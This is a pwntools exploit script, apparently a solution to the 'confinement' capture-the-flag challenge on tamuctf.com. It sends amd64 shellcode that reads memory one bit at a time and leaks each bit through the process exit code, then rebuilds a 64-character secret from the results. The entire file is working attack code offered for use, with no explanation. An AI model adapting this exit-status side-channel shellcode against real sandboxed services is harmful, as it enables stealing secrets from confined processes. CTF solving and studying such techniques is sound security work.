from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
	if local<2:
		gdb.attach(p,'''
			set follow-fork-mode child
			b* main+69
			''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./confinement")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
nc="nc zae 14"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
	p=remote(host,port)
else:
	p=process([exe.path])

############### helper functions ##############
def send():
	pass
def getchar(pos,b):
	#p=process([exe.path])
	p = remote("tamuctf.com", 443, ssl=True, sni="confinement")
	shellcode=asm('''
		mov rcx,QWORD ptr[rsp]
		add rcx,{}
		mov rdi,QWORD PTR[rcx]
		shr rdi,{}
		and rdi,1
		mov rax,231
		syscall
		'''.format(pos,b))
	
	p.sendline(shellcode)
	msg=p.recvall(timeout=0.5)
	p.close()
	if b"adios" in msg:
		return 0 
	return 1 

############### main exploit    ###############
offset=0x55555559b020-0x00005555555762c6
print(hex(offset))
res=""
resultat=""
for j in range(64):
	res=""
	for i in range(8):
		res=str(getchar(offset+j,i))+res
	resultat+=chr(int(res,2))
	print(resultat)
#debug()
print(resultat)



p.interactive()